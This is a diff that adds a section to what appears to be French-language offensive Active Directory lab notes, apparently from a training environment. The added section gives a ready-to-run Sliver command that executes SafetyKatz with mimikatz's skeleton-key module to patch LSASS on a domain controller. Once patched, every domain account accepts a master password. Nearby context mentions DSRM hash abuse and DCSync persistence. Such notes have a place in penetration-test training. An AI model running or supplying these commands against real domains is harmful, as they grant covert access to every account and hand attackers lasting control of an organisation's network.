@@ -56,6 +56,15 @@ Un compte de domaine accepté par une instance SQL permet le crawl des database 
 
 Le compte **DSRM** est l'administrateur local du DC ; son hash permet un accès au DC indépendant du domaine. Persistance délivrée via PEzor + remote-sc-*.
 
+### Persistance — Skeleton Key
+
+```bash
+# Patch du LSASS du DC (mot de passe maître = "mimikatz") — DA requis
+execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/SafetyKatz.exe' '"privilege::debug" "misc::skeleton" -ComputerName dcorp-dc.dollarcorp.moneycorp.local'
+```
+
+Après le patch, tout compte du domaine accepte le mot de passe `mimikatz` en plus du sien. Non persistant au reboot, non OPSEC-safe, casse AD CS — accès court uniquement. Voir [[Cheatsheet - Persistence]].
+
 ### Persistance — DCSync rights (StandIn)
 
 ```bash
